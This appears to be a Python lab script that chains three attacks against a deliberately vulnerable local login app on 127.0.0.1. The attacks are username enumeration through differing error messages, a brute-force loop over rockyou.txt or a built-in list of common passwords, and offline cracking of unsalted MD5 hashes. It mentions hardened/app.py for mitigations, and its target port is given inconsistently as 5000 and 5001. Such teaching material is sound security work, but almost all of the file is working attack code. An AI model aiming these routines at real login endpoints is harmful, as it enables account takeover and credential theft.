"""
ATTACK DEMONSTRATION — System 1: Vulnerable Basic Auth
Three attacks chained in sequence:

  Attack 1 — Username Enumeration  (exploit verbose error messages)
  Attack 2 — Credential Brute Force (exploit zero rate limiting)
  Attack 3 — Offline MD5 Crack     (same technique as Kioptrix)

Target: http://127.0.0.1:5000
Run this AFTER starting vulnerable/app.py
"""

import requests
import time
import hashlib
import sys

TARGET   = "http://127.0.0.1:5001"
LOGIN    = f"{TARGET}/login"


# ─────────────────────────────────────────────────────────────
# ATTACK 1: Username Enumeration
#
# The vulnerable app returns "User not found" vs "Wrong password".
# We send a known-bad password against every candidate username.
# A different error message = valid username confirmed.
# ─────────────────────────────────────────────────────────────

def enumerate_usernames(candidates: list[str]) -> list[str]:
    print("\n" + "═" * 60)
    print("ATTACK 1 — Username Enumeration")
    print(f"Target: {LOGIN}")
    print(f"Method: Exploit verbose error messages")
    print(f"Probe password: 'DefinitelyNotReal_XYZ123'")
    print("═" * 60)

    valid = []
    for username in candidates:
        r = requests.post(LOGIN, data={
            "username": username,
            "password": "DefinitelyNotReal_XYZ123"
        })

        if "Wrong password" in r.text:
            # Server confirmed username exists before rejecting the password
            print(f"  [+] VALID → {username}")
            valid.append(username)
        elif "User not found" in r.text:
            print(f"  [-] Invalid: {username}")
        else:
            print(f"  [?] Unexpected response ({r.status_code}): {username}")

        time.sleep(0.03)

    print(f"\n  [*] {len(valid)} valid usernames found: {valid}")
    return valid


# ─────────────────────────────────────────────────────────────
# ATTACK 2: Credential Brute Force
#
# No rate limiting = full network speed.
# We use a validated username from Attack 1 — no wasted attempts
# on non-existent accounts. This is how a real attacker works.
# ─────────────────────────────────────────────────────────────

def brute_force(username: str, wordlist_path: str | None = None) -> str | None:
    print("\n" + "═" * 60)
    print(f"ATTACK 2 — Brute Force | Target user: '{username}'")
    print(f"Target: {LOGIN}")
    print("═" * 60)

    # Load wordlist — use rockyou.txt on Kali, else fall back to builtin
    if wordlist_path:
        try:
            with open(wordlist_path, "r", encoding="latin-1") as f:
                passwords = [l.strip() for l in f.readlines()[:20_000]]
            print(f"  [*] Loaded {len(passwords)} passwords from {wordlist_path}")
        except FileNotFoundError:
            print(f"  [!] {wordlist_path} not found — using built-in list")
            passwords = _builtin_wordlist()
    else:
        passwords = _builtin_wordlist()
        print(f"  [*] Using built-in list ({len(passwords)} passwords)")

    start   = time.time()
    count   = 0
    session = requests.Session()  # Reuse TCP connection — faster

    for pwd in passwords:
        count += 1
        r = session.post(LOGIN, data={"username": username, "password": pwd})

        # Success: either redirect to dashboard or dashboard content present
        if "Welcome" in r.text or r.url.endswith("/dashboard"):
            elapsed = time.time() - start
            rate    = count / elapsed
            print(f"\n  [+] PASSWORD FOUND: '{pwd}'")
            print(f"  [+] Attempts: {count} | Time: {elapsed:.1f}s | Rate: {rate:.0f} req/s")
            return pwd

        # Progress report every 200 attempts
        if count % 200 == 0:
            elapsed = time.time() - start
            print(f"  [*] {count} attempts | {elapsed:.1f}s | {count/elapsed:.0f} req/s ...")

    print(f"\n  [-] Password not in wordlist after {count} attempts.")
    return None


# ─────────────────────────────────────────────────────────────
# ATTACK 3: Offline MD5 Hash Cracking
#
# If you dump the DB (via SQLi, misconfigured backup, LFI, etc.),
# you get the raw MD5 hashes. No server required after that.
# This is identical to what you did against Kioptrix:
#   hash extracted → rockyou.txt → cracked locally in seconds.
#
# The key: unsalted MD5 means:
#   (a) rainbow tables work directly
#   (b) two users with same password → identical hash → one crack = both cracked
#   (c) hashcat runs at 10+ billion hashes/sec on a GPU
# ─────────────────────────────────────────────────────────────

def crack_md5_offline(target_hash: str, wordlist: list[str] | None = None) -> str | None:
    print("\n" + "═" * 60)
    print("ATTACK 3 — Offline MD5 Crack")
    print(f"Target hash: {target_hash}")
    print("No server needed — works entirely offline.")
    print("═" * 60)

    passwords = wordlist or _builtin_wordlist()
    start     = time.time()

    for pwd in passwords:
        if hashlib.md5(pwd.encode()).hexdigest() == target_hash:
            elapsed = time.time() - start
            print(f"\n  [+] CRACKED: {target_hash}")
            print(f"  [+] Plaintext: '{pwd}' | Time: {elapsed*1000:.1f}ms")
            return pwd

    print(f"  [-] Hash not found in {len(passwords)}-entry wordlist.")
    return None


def _builtin_wordlist() -> list[str]:
    """Subset of rockyou.txt top entries — enough for demo."""
    return [
        "123456", "password", "12345678", "qwerty", "123456789",
        "12345", "1234", "111111", "1234567", "dragon",
        "123123", "baseball", "iloveyou", "trustno1", "sunshine",
        "master", "welcome", "shadow", "superman", "michael",
        "football", "batman", "pass", "monkey", "letmein",
        "abc123", "admin", "admin123", "root", "toor",
        "password1", "Password1", "test", "guest", "login",
        "changeme", "default", "P@ssword", "qwerty123", "1q2w3e",
    ]


# ─────────────────────────────────────────────────────────────
# MAIN — Chain all three attacks
# ─────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print("╔══════════════════════════════════════════════════════════╗")
    print("║  SYSTEM 1 — Authentication Attack Chain                 ║")
    print("║  Target: Basic Password Auth (Vulnerable Implementation) ║")
    print("╚══════════════════════════════════════════════════════════╝")

    # — Phase 1: Enumerate valid usernames —
    candidates = [
        "admin", "administrator", "root", "user",
        "john", "alice", "bob", "test", "guest", "support"
    ]
    valid_users = enumerate_usernames(candidates)

    if not valid_users:
        print("\n[!] No valid users found. Is vulnerable/app.py running on port 5000?")
        sys.exit(1)

    # — Phase 2: Brute-force the first valid user —
    target_user = valid_users[0]
    rockyou     = "/usr/share/wordlists/rockyou.txt"  # Kali path
    found_pwd   = brute_force(target_user, wordlist_path=rockyou)

    # — Phase 3: Demonstrate offline cracking —
    # Simulates: you dumped the DB via SQLi, got these hashes
    print("\n[*] Simulating DB dump — cracking extracted hashes offline...")
    stolen_hashes = {
        "admin": hashlib.md5(b"admin123").hexdigest(),
        "john":  hashlib.md5(b"password").hexdigest(),
        "alice": hashlib.md5(b"123456").hexdigest(),
    }
    for uname, h in stolen_hashes.items():
        print(f"\n  Cracking hash for '{uname}': {h}")
        crack_md5_offline(h)

    print("\n" + "═" * 60)
    print("SUMMARY")
    print(f"  Valid users found:  {valid_users}")
    print(f"  Password cracked:   {found_pwd or 'not in wordlist'}")
    print(f"  All hashes cracked: yes (in milliseconds, offline)")
    print("═" * 60)
    print("\n[*] Attack complete. See hardened/app.py for mitigations.")
